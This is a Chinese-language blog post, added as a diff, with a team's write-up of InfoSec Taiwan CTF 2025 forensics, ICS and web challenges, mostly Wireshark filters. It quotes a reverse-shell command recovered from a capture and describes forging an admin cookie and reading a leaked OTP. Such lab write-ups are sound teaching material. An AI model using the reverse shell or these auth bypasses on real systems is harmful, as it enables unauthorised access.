@@ -1,0 +1,382 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>InfoSec Taiwan CTF 2025 Write-up | Sh1ro&#39;s Blog</title>
+    <meta name="author" content="Sh1ro" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>伺服器加載中 請稍後... </p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>SH1RO&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;SH1RO&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>InfoSec Taiwan CTF 2025 Write-up</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/15
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #ff7d73">
+                    CTF
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <blockquote>
+<p>Team:P@assw0rd!</p>
+<p>yiwen1825 [captain]	<br>xiaobai0426 [member] &lt;– Me<br>kkoebi [member]	</p>
+</blockquote>
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Bit-By-Bit"><a href="#Bit-By-Bit" class="headerlink" title="Bit By Bit"></a>Bit By Bit</h3><p>Ans:HTB{b1tbuck3t5_publ1c_r3p0s_g0_brrr!!}</p>
+<p><img src="https://hackmd.io/_uploads/BJGfFl2Sgx.png" alt="image"></p>
+<hr>
+<ol>
+<li><p>解壓縮該檔案後，發現是個pcap檔，使用Wireshark打開後，先檢查Protocol Hierarchy，發現流量多為HTTP<br><img src="https://hackmd.io/_uploads/BkV_tgnrlx.png" alt="image"></p>
+</li>
+<li><p>過濾出HTTP的封包後，發現只有7個封包，先打開最底下的封包看看?<br><img src="https://hackmd.io/_uploads/B1SxqehSlx.png" alt="image"></p>
+</li>
+<li><p>發現這是個Command Injection的封包，從GET的URL可以得知這一訊息，確定了這是攻擊者的封包後，那就可以去找攻擊後進入系統後所輸入的指令(從注入的命令可以知道這是個reverse shell)</p>
+</li>
+</ol>
+<pre><code class="language-Wireshark=">Command:
+bash -i -p &gt;&amp; /dev/tcp/172.17.0.1/5912 0&gt;&amp;1
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/Syzhcg3Bll.png" alt="image"></p>
+<ol start="4">
+<li><p>可以試著往後翻看看stream(正常來講是去定位Command的IP位置跟Port，不過這題的封包數量很少，所以就用這招試看看能不能找到攻擊者遠端執行的Command)</p>
+</li>
+<li><p>發現在stream 4確實有Reverse shell留下的痕跡<br><img src="https://hackmd.io/_uploads/rJLNie2Beg.png" alt="image"></p>
+</li>
+<li><p>接著往後看看攻擊者有沒有留下什麼資訊(像是主辦方放的Flag XD)，在最底下找到了echo base64的指令，並存在了support.desktop中，將這段base64的訊息解密後即可獲得flag<br><img src="https://hackmd.io/_uploads/B1Q_ol2See.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1P6sx3rxg.png" alt="image"><br>再將Comment進行二次decode(base64)<br><img src="https://hackmd.io/_uploads/SJQxhg2Hex.png" alt="image"></p>
+</li>
+</ol>
+<h3 id="The-Wire"><a href="#The-Wire" class="headerlink" title="The Wire"></a>The Wire</h3><p>Ans:HTB{I_g0t_th3_w1r3_4nd_y0u_g0t_th3_fl@g!!_98351ca6b8e61a1003c5114eb178a71a}</p>
+<p><img src="https://hackmd.io/_uploads/S1dqhlnrle.png" alt="image"></p>
+<hr>
+<ol>
+<li>這題解壓縮後看到了pcapng檔，不過先把題目附的docker啟動，我們要解開docker附的12個有關這個封包的題目才可以取得flag(按照題目敘述)</li>
+</ol>
+<p>啟動後如下：<br><img src="https://hackmd.io/_uploads/ryDyTehrll.png" alt="image"></p>
+<ol start="2">
+<li><p>Ok.. 所以我們就依照他給的題目慢慢回答吧，第一題是封包檔紀錄的總封包數量<br>Wireshark的右下角就會統整好了<br><img src="https://hackmd.io/_uploads/B1U_6enSeg.png" alt="螢幕擷取畫面 2025-07-09 223118"></p>
+</li>
+<li><p>接著是第二題，第一個封包的Timestamp為多少(In seconds)，所以我們要把第一個封包的時間轉成UTC下的second，<br>可以從View -&gt; Time Display Format -&gt; Second Since 1970-01-01更改，最後再把第一個封包的Timestamp時間輸入上去就Correct了(後面的小數點可以不用打)<br><img src="https://hackmd.io/_uploads/H1CcplnHee.png" alt="image"><br><img src="https://hackmd.io/_uploads/SJTSCg2rxx.png" alt="image"></p>
+</li>
+<li><p>到了第三題，要篩選出從192.168.1.103到151.101.129.140的流量，並記錄封包數量<br>那就直接Fliter出來，然後從Wireshark的右下角就能看到Display的數量了</p>
+</li>
+</ol>
+<pre><code class="language-Wireshark=">Fliter:
+ip.src == 192.168.1.103 &amp;&amp; ip.dst == 151.101.129.140
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/BJ-_0ghBee.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1YRCl2Hxe.png" alt="image"></p>
+<ol start="5">
+<li>很快到了第四題，我們要計算從192.168.1.108到116.203.58.90的Bytes，一樣用剛剛的Fliter，只是改一下IP位置，<br>過濾出來後就直接打開Conversation，接著看兩個IP之間的Bytes即為答案</li>
+</ol>
+<pre><code class="language-Wireshark=">Fliter:
+ip.src == 192.168.1.108 &amp;&amp; ip.dst == 116.203.58.90
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/B1BgkZhBgg.png" alt="image"><br><img src="https://hackmd.io/_uploads/ByVqy-nrge.png" alt="image"></p>
+<ol start="6">
+<li>接著是第五題，這題要篩出所有封包長度為121 bytes的封包數量，一樣直接用Fliter就能搞定</li>
+</ol>
+<pre><code class="language-=">Fliter:
+frame.len == 121
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/HJY4eW2Sxe.png" alt="image"><br><img src="https://hackmd.io/_uploads/rkT_eb2Slx.png" alt="image"></p>
+<ol start="7">
+<li>第六題，要篩出所有來源和目的為151.101.129.140，直接Fliter ip.addr就可以了</li>
+</ol>
+<pre><code class="language-=">Fliter:
+ip.addr == 151.101.129.140
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/S199g-2Slx.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkZgbZ2Hel.png" alt="image"></p>
+<ol start="8">
+<li>然後是第七題，直接篩TCP就可以獲得答案</li>
+</ol>
+<pre><code class="language-=">Fliter:
+tcp
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/rJvGbZ2Hxe.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkjrWbnBgl.png" alt="image"></p>
+<ol start="9">
+<li><p>來到第八題，這題要到封包#374，並找到Destination的MAC Address，直接在Wireshark Ctrl + G到374後，在Ethernet II介面中，後面的dst就有包含MAC Address了<br><img src="https://hackmd.io/_uploads/rJSDbZ2Sll.png" alt="image"><br><img src="https://hackmd.io/_uploads/Bk1yfbhHge.png" alt="image"></p>
+</li>
+<li><p>第九題中，要取得IP 192.168.1.103的MAC Address，所以把所有IP為192.168.1.103的封包Fliter出來後，<br>一樣找到Ethernet的位置就能取得答案了(記得看清楚是src還是dst)</p>
+</li>
+</ol>
+<pre><code class="language-=">Fliter:
+ip.addr == 192.168.1.103
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/S1VZz-nBgg.png" alt="image"><br><img src="https://hackmd.io/_uploads/rJsLMb2Slx.png" alt="image"></p>
+<ol start="11">
+<li>接著到第十題，會需要過濾出HTTP GET的封包之外，還需要找到success.txt，所以可以寫這樣一個Fliter，接著右鍵點擊其中一個封包後，<br>Follow到HTTP Stream，找到HOST的Header，將他的Value輸上去就可以進到下一題</li>
+</ol>
+<pre><code class="language-=">Fliter:
+http.request.method == &quot;GET&quot; and http.request.uri contains &quot;success.txt&quot;
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/Sk_sM-3rgg.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1gb7Znrle.png" alt="image"></p>
+<ol start="12">
+<li>到了第十一題，一樣Ctrl+G到11492，要注意的是滑鼠要點擊IPv4的介面(左下角)，右下角的Hex視窗就會反白出來，把前4個Bytes輸上去就能獲得答案<br><img src="https://hackmd.io/_uploads/B1gfvmW3Slx.png" alt="image"><br><img src="https://hackmd.io/_uploads/Byk1Nb3Blx.png" alt="image"></li>
+</ol>
+<p>:::info<br>為什麼要點擊IPv4呢？因為題目提到了OSI第三層，也就是所謂的網路層，這跟IP、ARP這些Protocol有關，所以找到這個也就可以找出網路層的Bytes<br>:::</p>
+<ol start="13">
+<li><p>終於來到最後一題了&#x3D; &#x3D;，這一題只是要取得Seq跟Ack的Value，所以一樣直接Ctrl+G到18632，在TCP的介面中就寫得一清二楚了<br><img src="https://hackmd.io/_uploads/HkUQHW3Beg.png" alt="image"><br><img src="https://hackmd.io/_uploads/SJsuSZnrlg.png" alt="image"></p>
+</li>
+<li><p>全部12題回答正確後，就能取得本題的Flag了OuO<br><img src="https://hackmd.io/_uploads/S1X3BWnSgg.png" alt="image"></p>
+</li>
+</ol>
+<h3 id="First-Attempt"><a href="#First-Attempt" class="headerlink" title="First Attempt"></a>First Attempt</h3><p>Ans:HTB{L3ts_k33p_1t_s1mpl3_4nd_st34lthy}<br><img src="https://hackmd.io/_uploads/S1W7LW2Slx.png" alt="image"></p>
+<hr>
+<ol>
+<li><p>解壓縮後可以得到一個key.docm，由於看到docm，所以就能知道這是個Word的巨集檔，所以用oletools來分析</p>
+</li>
+<li><p>使用olevba來解，執行後可以看到一整個巨集的指令，以及該工具自行分析出惡意的結果在中間部分可以看到有個function，會去執行powershell的Command，<br>在中間也有加密的痕跡，而細看後就會看到有一個定義flag的字串，只不過也經過了加密(不過沒很難)，就按照他的方式倒轉回來就能取得Flag了<br><img src="https://hackmd.io/_uploads/SkjyD-nBgl.png" alt="image"></p>
+</li>
+</ol>
+<p>:::info<br>$flag&#x3D;’HTB{“ &amp; Chr(Asc(“L”)) &amp; “3ts” &amp; Chr(95) &amp; “k33” &amp; Chr(112) &amp; “<em>1t</em>“ &amp; StrReverse (“3lpm1s”) &amp; “_4nd” &amp; “_st34lthy}’</p>
+<p>&#x3D;&#x3D;(當中的Chr跟StrReverse應該都不需要解釋..ww，有點太基礎)&#x3D;&#x3D;</p>
+<p>To</p>
+<p>HTB{L3ts_k33p_1t_s1mpl3_4nd_st34lthy}<br>:::</p>
+<h2 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h2><h3 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h3><p>Ans:HTB{MOd8u5_23rO_3CnRYpYp7IoNT@x30}</p>
+<p><img src="https://hackmd.io/_uploads/SJD_OZ3Slx.png" alt="image"></p>
+<hr>
+<ol>
+<li><p>解壓縮後發現又是封包XD，一樣先檢查Protocol，發現是ModBus&#x2F;TCP，這樣的話就可以直接Follow了(因為封包數量少的可憐 才78)，發現是看不懂的東西<br><img src="https://hackmd.io/_uploads/SyjbF-nrex.png" alt="image"></p>
+</li>
+<li><p>那就試著轉成Hex？因為Modbus主要用於IIOT跟ICS，而ModBus的暫存器主要是以16位元來進行讀寫，所以翻成Hex搞不好能看到一些通訊交換的Data，<br>果不其然在底下發現了HTB開頭的文字，將所有字都翻出來就能找到Flag了<br><img src="https://hackmd.io/_uploads/BJVJc-nBgx.png" alt="image"></p>
+</li>
+</ol>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="MFlow"><a href="#MFlow" class="headerlink" title="MFlow"></a>MFlow</h3><p>Ans:HTB{s3ss10n_int3gritY_1s_n0t_t0_b3_m3ss3d_w1th_15fbfac10639338fc9800791c575c894}</p>
+<p><img src="https://hackmd.io/_uploads/HJdIcW2rex.png" alt="image"></p>
+<hr>
+<ol>
+<li><p>先打開Docker後，附了IP位置跟Port，連接過去後，會進到一個register的頁面，先隨便輸個帳號密碼進去看看系統長什麼樣</p>
+</li>
+<li><p>看起來是個銷售網站？而在Welcome Back底下中寫著要成為admin才能看到Flag，所以方向已經很明顯了，先看看Cookie能不能更改<br><img src="https://hackmd.io/_uploads/ryr05-3rgx.png" alt="image"></p>
+</li>
+<li><p>發現有兩個Cookie，一個是Session，一個是Auth，先看看Auth，看起來是使用base64加密的，先試著decode看看<br><img src="https://hackmd.io/_uploads/HkrviWnHgg.png" alt="image"></p>
+</li>
+<li><p>發現有個用於判斷admin的值，那把is_admin從false修改成true，是不是就有辦法成為admin呢?將修改完的base64丟回Auth，<br>並重新整理(F5)，會發現真的變成了Admin，Flag也就出來了<br><img src="https://hackmd.io/_uploads/ry0Ci-3rgx.png" alt="image"></p>
+</li>
+</ol>
+<h3 id="Paradise-Vault"><a href="#Paradise-Vault" class="headerlink" title="Paradise Vault"></a>Paradise Vault</h3><p>Ans:HTB{l34k1ng_0Tp_1nt0_Cl13n7s1d3_1s_b4d_8b6c48a05e3f722a809d4091bd6da3a0}</p>
+<p><img src="https://hackmd.io/_uploads/B1Pb3-2Hgl.png" alt="image"></p>
+<hr>
+<ol>
+<li><p>一樣打開docker，然後一樣給了IP位置，連過去發現是個登入頁面，這邊真的就是通靈了，我那時候覺得跟AIS3 Pre-Exam的某一題很像，<br>所以我就試了admin跟admin，就跳到OTP驗證了(還真的跟AIS3差不多 笑死)<br><img src="https://hackmd.io/_uploads/r10shZhBgx.png" alt="image"></p>
+</li>
+<li><p>接著打開Network看後，發現每當我們進入到OTP這個頁面後，伺服器會自動Request一個OTP，而裡面就寫著驗證碼，嘗試輸入看看?<br><img src="https://hackmd.io/_uploads/rJPnaW2Bxl.png" alt="image"></p>
+</li>
+<li><p>然後flag就出來了<br><img src="https://hackmd.io/_uploads/BykbCb2Hxg.png" alt="image"></p>
+</li>
+</ol>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>這次比賽藍隊方面基本上都是水題，rev跟pwn比較沒在接觸所以交給了兩名隊友<br>感謝兩位大佬的幫忙QQ，希望下次能得到更好的名次</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 Sh1ro&#39;s Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Sh1ro
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
